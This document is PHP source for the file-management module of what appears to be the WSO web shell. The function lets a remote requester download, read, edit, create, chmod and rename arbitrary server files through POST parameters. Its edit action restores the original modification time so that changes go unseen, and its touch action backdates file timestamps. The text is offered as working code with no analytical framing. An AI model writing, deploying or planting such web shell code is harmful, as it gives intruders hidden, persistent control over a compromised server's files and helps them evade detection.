<?php
function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	wsoHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		wsoFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.wsoPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Change time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
	}
	echo '</div>';
	wsoFooter();
}